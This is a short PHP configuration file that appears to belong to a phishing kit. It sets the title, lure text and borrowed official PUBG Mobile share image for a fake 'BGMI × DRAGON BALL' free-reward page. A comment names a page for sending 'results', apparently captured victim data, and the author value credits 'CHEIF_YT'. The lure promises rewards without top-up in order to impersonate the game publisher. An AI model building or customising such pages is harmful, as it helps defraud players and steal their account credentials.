<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Kolkata');
$cheifyt = date('l, d-m-Y h:i:s');
$cheif = date('Y');


// KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'BGMI × DRAGON BALL';
$description = 'Collect your special rewards at the BGMI × DRAGON BALL. This opportunity is limited and without the need for topup. Collect your rewards now!';
$copyright = 'BGMI';
$theme = '#000';
$image = 'http://www.pubgmobile.com/en/event/missionignition/images/share.jpg';
$icon = 'img/icon.png';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'CHEIF_YT';
?>